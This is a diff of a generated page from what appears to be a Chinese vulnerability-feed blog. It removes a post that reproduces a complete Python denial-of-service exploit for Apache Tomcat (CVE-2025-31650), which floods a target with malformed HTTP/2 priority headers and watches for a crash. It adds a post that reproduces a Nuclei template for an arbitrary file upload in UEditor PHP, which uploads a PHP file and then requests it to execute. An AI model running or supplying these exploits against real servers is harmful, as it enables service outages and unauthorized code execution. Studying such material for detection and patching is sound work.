@@ -19,23 +19,23 @@
   <meta name="author" content="lianccc">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞信息漏洞名称： Apache Tomcat 10.1.39 - Denial of Service (DOS) 漏洞编号：  CVE： CVE-2025-31650  漏洞类型： 服务端请求伪造 漏洞等级： 高危 漏洞描述： Apache Tomcat 10.1.10至10.1.39版本中存在一个通过无效HTTP&#x2F;2优先级头导致的内存泄漏漏洞，攻击者可以利用此漏洞进行拒绝服务攻击。">
+    <meta name="description" content="漏洞信息漏洞名称： UEditor PHP 任意文件上传漏洞 漏洞类型： 文件上传 漏洞等级： 严重 漏洞描述： 检测UEditor PHP中的任意文件上传漏洞，通过尝试上传和执行PHP文件来验证漏洞的存在。 产品名称： UEditor PHP 来源： https:&#x2F;&#x2F;github.com&#x2F;projectdiscovery&#x2F;nuclei-templates&#x2F;issues&#x2F;12336 类型： pro">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Apache Tomcat 10.1.39 - Denial of Service (DOS)">
-<meta property="og:url" content="http://example.com/2025/06/13/github_549852678/index.html">
+<meta property="og:title" content="UEditor PHP 任意文件上传漏洞">
+<meta property="og:url" content="http://example.com/2025/06/13/github_2053973950/index.html">
 <meta property="og:site_name" content="liancc&#39; infos blog">
-<meta property="og:description" content="漏洞信息漏洞名称： Apache Tomcat 10.1.39 - Denial of Service (DOS) 漏洞编号：  CVE： CVE-2025-31650  漏洞类型： 服务端请求伪造 漏洞等级： 高危 漏洞描述： Apache Tomcat 10.1.10至10.1.39版本中存在一个通过无效HTTP&#x2F;2优先级头导致的内存泄漏漏洞，攻击者可以利用此漏洞进行拒绝服务攻击。">
+<meta property="og:description" content="漏洞信息漏洞名称： UEditor PHP 任意文件上传漏洞 漏洞类型： 文件上传 漏洞等级： 严重 漏洞描述： 检测UEditor PHP中的任意文件上传漏洞，通过尝试上传和执行PHP文件来验证漏洞的存在。 产品名称： UEditor PHP 来源： https:&#x2F;&#x2F;github.com&#x2F;projectdiscovery&#x2F;nuclei-templates&#x2F;issues&#x2F;12336 类型： pro">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-13T14:45:24.152Z">
-<meta property="article:modified_time" content="2025-06-13T14:45:24.148Z">
+<meta property="article:published_time" content="2025-06-13T15:00:14.469Z">
+<meta property="article:modified_time" content="2025-06-13T15:00:14.465Z">
 <meta property="article:author" content="lianccc">
-<meta property="article:tag" content="CVE-2025:github search">
-<meta property="article:tag" content="服务端请求伪造">
+<meta property="article:tag" content="projectdiscovery&#x2F;nuclei-templates:github issues">
+<meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Apache Tomcat 10.1.39 - Denial of Service (DOS) - liancc&#39; infos blog</title>
+  <title>UEditor PHP 任意文件上传漏洞 - liancc&#39; infos blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Apache Tomcat 10.1.39 - Denial of Service (DOS)"></span>
+            <span id="subtitle" data-typed-text="UEditor PHP 任意文件上传漏洞"></span>
           
         </div>
 
@@ -213,7 +213,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-13 14:45" pubdate>
+        <time datetime="2025-06-13 15:00" pubdate>
           2025年6月13日 下午
         </time>
       </span>
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          995 字
+          315 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          9 分钟
+          3 分钟
         
       </span>
     
@@ -273,119 +273,26 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Apache Tomcat 10.1.39 - Denial of Service (DOS)</h1>
+            <h1 id="seo-header">UEditor PHP 任意文件上传漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache Tomcat 10.1.39 - Denial of Service (DOS)</p>
-<p><strong>漏洞编号：</strong></p>
-<ul>
-<li><strong>CVE：</strong> CVE-2025-31650</li>
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> UEditor PHP 任意文件上传漏洞</p>
+<p><strong>漏洞类型：</strong> 文件上传</p>
+<p><strong>漏洞等级：</strong> 严重</p>
+<p><strong>漏洞描述：</strong> 检测UEditor PHP中的任意文件上传漏洞，通过尝试上传和执行PHP文件来验证漏洞的存在。</p>
+<p><strong>产品名称：</strong> UEditor PHP</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/issues/12336">https://github.com/projectdiscovery/nuclei-templates/issues/12336</a></p>
+<p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p>
+<h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Is-there-an-existing-template-for-this"><a href="#Is-there-an-existing-template-for-this" class="headerlink" title="Is there an existing template for this?"></a>Is there an existing template for this?</h4><ul>
+<li><input checked="" disabled="" type="checkbox"> I have searched the existing templates.</li>
 </ul>
-<p><strong>漏洞类型：</strong> 服务端请求伪造</p>
-<p><strong>漏洞等级：</strong> 高危</p>
-<p><strong>漏洞描述：</strong> Apache Tomcat 10.1.10至10.1.39版本中存在一个通过无效HTTP&#x2F;2优先级头导致的内存泄漏漏洞，攻击者可以利用此漏洞进行拒绝服务攻击。</p>
-<p><strong>产品厂商：</strong> Apache</p>
-<p><strong>产品名称：</strong> Apache Tomcat</p>
-<p><strong>影响版本：</strong> 10.1.10 &lt;&#x3D; version &lt;&#x3D; 10.1.39</p>
-<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/assad12341/Dos-exploit-">https://github.com/assad12341/Dos-exploit-</a></p>
-<p><strong>类型：</strong> CVE-2025:github search</p>
-<h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul>
-<li>52318.py</li>
-<li>README.md</li>
-</ul>
-<h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Dos-exploit"><a href="#Dos-exploit" class="headerlink" title="Dos-exploit-"></a>Dos-exploit-</h2><p>CVE-2025-31650</p>
-<h2 id="Exploit-Title-Apache-Tomcat-10-1-39-Denial-of-Service-DOS"><a href="#Exploit-Title-Apache-Tomcat-10-1-39-Denial-of-Service-DOS" class="headerlink" title="Exploit Title: Apache Tomcat 10.1.39 - Denial of Service (DOS)"></a>Exploit Title: Apache Tomcat 10.1.39 - Denial of Service (DOS)</h2><h2 id="Author-Abdualhadi-khalifa"><a href="#Author-Abdualhadi-khalifa" class="headerlink" title="Author: Abdualhadi khalifa"></a>Author: Abdualhadi khalifa</h2><h2 id="CVE-CVE-2025-31650"><a href="#CVE-CVE-2025-31650" class="headerlink" title="CVE: CVE-2025-31650"></a>CVE: CVE-2025-31650</h2><p>import httpx<br>import asyncio<br>import random<br>import urllib.parse<br>import sys<br>import socket<br>from colorama import init, Fore, Style</p>
-<p>init()</p>
-<p>class TomcatKiller:<br>    def <strong>init</strong>(self):<br>        self.success_count &#x3D; 0<br>        self.error_count &#x3D; 0<br>        self.invalid_priorities &#x3D; [<br>            \&quot;u&#x3D;-1, q&#x3D;2\&quot;,<br>            \&quot;u&#x3D;4294967295, q&#x3D;-1\&quot;,<br>            \&quot;u&#x3D;-2147483648, q&#x3D;1.5\&quot;,<br>            \&quot;u&#x3D;0, q&#x3D;invalid\&quot;,<br>            \&quot;u&#x3D;1&#x2F;0, q&#x3D;NaN\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;2, invalid&#x3D;param\&quot;,<br>            \&quot;\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1, u&#x3D;2\&quot;,<br>            \&quot;u&#x3D;99999999999999999999, q&#x3D;0\&quot;,<br>            \&quot;u&#x3D;-99999999999999999999, q&#x3D;0\&quot;,<br>            \&quot;u&#x3D;, q&#x3D;\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1, malformed\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;, invalid\&quot;,<br>            \&quot;u&#x3D;-1, q&#x3D;4294967295\&quot;,<br>            \&quot;u&#x3D;invalid, q&#x3D;1\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1, extra&#x3D;\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1; malformed\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1, &#x3D;invalid\&quot;,<br>            \&quot;u&#x3D;0, q&#x3D;0, stream&#x3D;invalid\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1, priority&#x3D;recursive\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1, %invalid%\&quot;,<br>            \&quot;u&#x3D;0, q&#x3D;0, null&#x3D;0\&quot;,<br>        ]</p>
-<pre><code class="hljs">async def validate_url(self, url):
-    try:
-        parsed_url = urllib.parse.urlparse(url)
-        if not parsed_url.scheme or not parsed_url.hostname:
-            raise ValueError(\\\&quot;Invalid URL format. Use http:// or https://\\\&quot;)
-        host = parsed_url.hostname
-        port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == \\\&#39;https\\\&#39; else 80)
-        return host, port
-    except Exception:
-        print(f\\\&quot;&#123;Fore.RED&#125;Error: Invalid URL. Use http:// or https:// format.&#123;Style.RESET_ALL&#125;\\\&quot;)
-        sys.exit(1)
+<h4 id="Nuclei-Template"><a href="#Nuclei-Template" class="headerlink" title="Nuclei Template"></a>Nuclei Template</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">ueditor-php-arbitrary-file-upload</span><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">UEditor</span> <span class="hljs-string">PHP</span> <span class="hljs-string">Arbitrary</span> <span class="hljs-string">File</span> <span class="hljs-string">Upload</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ChiragArtani</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attr">description:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    Detects arbitrary file upload vulnerability in UEditor PHP by attempting to upload and execute a PHP file.</span><br><span class="hljs-string"></span><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        POST /ueditor/php/action_upload.php?action=uploadimage&amp;CONFIG[imagePathFormat]=ueditor/php/upload/aaaa&amp;CONFIG[imageMaxSize]=9999999&amp;CONFIG[imageAllowFiles][]=.php&amp;CONFIG[imageFieldName]=aaaa HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string">        Connection: keep-alive</span><br><span class="hljs-string">        Content-Length: 222</span><br><span class="hljs-string">        Cache-Control: max-age=0</span><br><span class="hljs-string">        Origin: null</span><br><span class="hljs-string">        Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36</span><br><span class="hljs-string">        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA</span><br><span class="hljs-string">        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="hljs-string">        Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4</span><br><span class="hljs-string"></span>        <br>        <span class="hljs-string">------WebKitFormBoundaryDMmqvK6b3ncX4xxA</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;aaaa&quot;;</span> <span class="hljs-string">filename=&quot;aaaa.php&quot;</span><br>        <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/octet-stream</span><br>        <br>        <span class="hljs-string">&lt;?php</span><br>        <span class="hljs-string">phpinfo();</span><br>        <span class="hljs-string">?&gt;</span><br>        <span class="hljs-string">------WebKitFormBoundaryDMmqvK6b3ncX4xxA--</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        GET /ueditor/php/upload/aaaa.php HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36</span><br><span class="hljs-string">        Accept: text/html</span><br><span class="hljs-string"></span><br>    <span class="hljs-attr">matchers-condition:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">status</span><br>        <span class="hljs-attr">status:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-number">200</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">body</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">regex</span><br>        <span class="hljs-attr">regex:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&lt;title&gt;phpinfo\\(\\)&lt;/title&gt;&quot;</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">body</span><br><br>    <span class="hljs-attr">extractors:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">regex</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">vuln_path</span><br>        <span class="hljs-attr">regex:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/ueditor/php/upload/aaaa\\.php&quot;</span><br></code></pre></td></tr></table></figure>
 
-async def check_http2_support(self, host, port):
-    async with httpx.AsyncClient(http2=True, verify=False, timeout=5, limits=httpx.Limits(max_connections=1000)) as client:
-        try:
-            response = await client.get(f\\\&quot;https://&#123;host&#125;:&#123;port&#125;/\\\&quot;, headers=&#123;\\\&quot;user-agent\\\&quot;: \\\&quot;TomcatKiller\\\&quot;&#125;)
-            if response.http_version == \\\&quot;HTTP/2\\\&quot;:
-                print(f\\\&quot;&#123;Fore.GREEN&#125;HTTP/2 supported! Proceeding ...&#123;Style.RESET_ALL&#125;\\\&quot;)
-                return True
-            else:
-                print(f\\\&quot;&#123;Fore.YELLOW&#125;Error: HTTP/2 not supported. This exploit requires HTTP/2.&#123;Style.RESET_ALL&#125;\\\&quot;)
-                return False
-        except Exception:
-            print(f\\\&quot;&#123;Fore.RED&#125;Error: Could not connect to &#123;host&#125;:&#123;port&#125;.&#123;Style.RESET_ALL&#125;\\\&quot;)
-            return False
+<h4 id="Relevant-dumped-responses"><a href="#Relevant-dumped-responses" class="headerlink" title="Relevant dumped responses"></a>Relevant dumped responses</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br></code></pre></td></tr></table></figure>
 
-async def send_invalid_priority_request(self, host, port, num_requests, task_id):
-    async with httpx.AsyncClient(http2=True, verify=False, timeout=0.3, limits=httpx.Limits(max_connections=1000)) as client:
-        url = f\\\&quot;https://&#123;host&#125;:&#123;port&#125;/\\\&quot;
-        for i in range(num_requests):
-            headers = &#123;
-                \\\&quot;priority\\\&quot;: random.choice(self.invalid_priorities),
-                \\\&quot;user-agent\\\&quot;: f\\\&quot;TomcatKiller-&#123;task_id&#125;-&#123;random.randint(1, 1000000)&#125;\\\&quot;,
-                \\\&quot;cache-control\\\&quot;: \\\&quot;no-cache\\\&quot;,
-                \\\&quot;accept\\\&quot;: f\\\&quot;*/*; q=&#123;random.random()&#125;\\\&quot;,
-            &#125;
-            try:
-                await client.get(url, headers=headers)
-                self.success_count += 1
-            except Exception:
-                self.error_count += 1
-
-async def monitor_server(self, host, port):
-    while True:
-        try:
-            with socket.create_connection((host, port), timeout=2):
-                print(f\\\&quot;&#123;Fore.YELLOW&#125;Target &#123;host&#125;:&#123;port&#125; is reachable.&#123;Style.RESET_ALL&#125;\\\&quot;)
-        except Exception:
-            print(f\\\&quot;&#123;Fore.RED&#125;Target &#123;host&#125;:&#123;port&#125; unreachable or crashed!&#123;Style.RESET_ALL&#125;\\\&quot;)
-            break
-        await asyncio.sleep(2)
-
-async def run_attack(self, host, port, num_tasks, requests_per_task):
-    print(f\\\&quot;&#123;Fore.GREEN&#125;Starting attack on &#123;host&#125;:&#123;port&#125;...&#123;Style.RESET_ALL&#125;\\\&quot;)
-    print(f\\\&quot;Tasks: &#123;num_tasks&#125;, Requests per task: &#123;requests_per_task&#125;\\\&quot;)
-    print(f\\\&quot;&#123;Fore.YELLOW&#125;Monitor memory manually via VisualVM or check catalina.out for OutOfMemoryError.&#123;Style.RESET_ALL&#125;\\\&quot;)
-
-    monitor_task = asyncio.create_task(self.monitor_server(host, port))
-    tasks = [self.send_invalid_priority_request(host, port, requests_per_task, i) for i in range(num_tasks)]
-    await asyncio.gather(*tasks)
-    monitor_task.cancel()
-
-    total_requests = num_tasks * requests_per_task
-    success_rate = (self.success_count / total_requests * 100) if total_requests &gt; 0 else 0
-    print(f\\\&quot;\\\\n&#123;Fore.MAGENTA&#125;===== Attack Summary =====&#123;Style.RESET_ALL&#125;\\\&quot;)
-    print(f\\\&quot;Target: &#123;host&#125;:&#123;port&#125;\\\&quot;)
-    print(f\\\&quot;Total Requests: &#123;total_requests&#125;\\\&quot;)
-    print(f\\\&quot;Successful Requests: &#123;self.success_count&#125;\\\&quot;)
-    print(f\\\&quot;Failed Requests: &#123;self.error_count&#125;\\\&quot;)
-    print(f\\\&quot;Success Rate: &#123;success_rate:.2f&#125;%\\\&quot;)
-    print(f\\\&quot;&#123;Fore.MAGENTA&#125;=========================&#123;Style.RESET_ALL&#125;\\\&quot;)
-</code></pre>
-<p>async def main():<br>    print(f\&quot;{Fore.BLUE}&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; TomcatKiller - CVE-2025-31650 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;{Style.RESET_ALL}\&quot;)<br>    print(f\&quot;Developed by: @absholi7ly\&quot;)<br>    print(f\&quot;Exploits memory leak in Apache Tomcat (10.1.10-10.1.39) via invalid HTTP&#x2F;2 priority headers.\&quot;)<br>    print(f\&quot;{Fore.YELLOW}Warning: For authorized testing only. Ensure HTTP&#x2F;2 and vulnerable Tomcat version.{Style.RESET_ALL}\\n\&quot;)</p>
-<pre><code class="hljs">url = input(f\\\&quot;&#123;Fore.CYAN&#125;Enter target URL (e.g., https://localhost:8443): &#123;Style.RESET_ALL&#125;\\\&quot;)
-num_tasks = int(input(f\\\&quot;&#123;Fore.CYAN&#125;Enter number of tasks (default 300): &#123;Style.RESET_ALL&#125;\\\&quot;) or 300)
-requests_per_task = int(input(f\\\&quot;&#123;Fore.CYAN&#125;Enter requests per task (default 100000): &#123;Style.RESET_ALL&#125;\\\&quot;) or 100000)
-
-tk = TomcatKiller()
-host, port = await tk.validate_url(url)
-
-if not await tk.check_http2_support(host, port):
-    sys.exit(1)
-
-await tk.run_attack(host, port, num_tasks, requests_per_task)
-</code></pre>
-<p>if <strong>name</strong> &#x3D;&#x3D; \&quot;<strong>main</strong>\&quot;:<br>    try:<br>        asyncio.run(main())<br>        print(f\&quot;{Fore.GREEN}Attack completed!{Style.RESET_ALL}\&quot;)<br>    except KeyboardInterrupt:<br>        print(f\&quot;{Fore.YELLOW}Attack interrupted by user.{Style.RESET_ALL}\&quot;)<br>        sys.exit(0)<br>    except Exception as e:<br>        print(f\&quot;{Fore.RED}Unexpected error: {e}{Style.RESET_ALL}\&quot;)<br>        sys.exit(1)</p>
-<p>Provide shell access.<br>Install backdoors or persistence mechanisms.<br>Perform any destructive actions.</p>
+<h4 id="Anything-else"><a href="#Anything-else" class="headerlink" title="Anything else?"></a>Anything else?</h4><p>Detects arbitrary file upload vulnerability in UEditor PHP by attempting to upload and execute a PHP file.<br>POC - <a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhibing/p/16893839.html#_4">https://www.cnblogs.com/zhibing/p/16893839.html#_4</a></p>
 
                 
               </div>
@@ -419,9 +326,9 @@ await tk.run_attack(host, port, num_tasks, requests_per_task)
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/CVE-2025-github-search/" class="print-no-link">#CVE-2025:github search</a>
+        <a href="/tags/projectdiscovery-nuclei-templates-github-issues/" class="print-no-link">#projectdiscovery/nuclei-templates:github issues</a>
       
-        <a href="/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" class="print-no-link">#服务端请求伪造</a>
+        <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="print-no-link">#文件上传</a>
       
     </div>
   
@@ -433,8 +340,8 @@ await tk.run_attack(host, port, num_tasks, requests_per_task)
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Apache Tomcat 10.1.39 - Denial of Service (DOS)</div>
-      <div>http://example.com/2025/06/13/github_549852678/</div>
+      <div>UEditor PHP 任意文件上传漏洞</div>
+      <div>http://example.com/2025/06/13/github_2053973950/</div>
     </div>
     <div class="license-meta">
       
@@ -478,18 +385,12 @@ await tk.run_attack(host, port, num_tasks, requests_per_task)
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/13/github_2053973950/" title="UEditor PHP 任意文件上传漏洞">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">UEditor PHP 任意文件上传漏洞</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/13/github_811000016/" title="DOS-exploit">
-                        <span class="hidden-mobile">DOS-exploit</span>
+                      <a href="/2025/06/13/github_549852678/" title="Apache Tomcat 10.1.39 - Denial of Service (DOS)">
+                        <span class="hidden-mobile">Apache Tomcat 10.1.39 - Denial of Service (DOS)</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
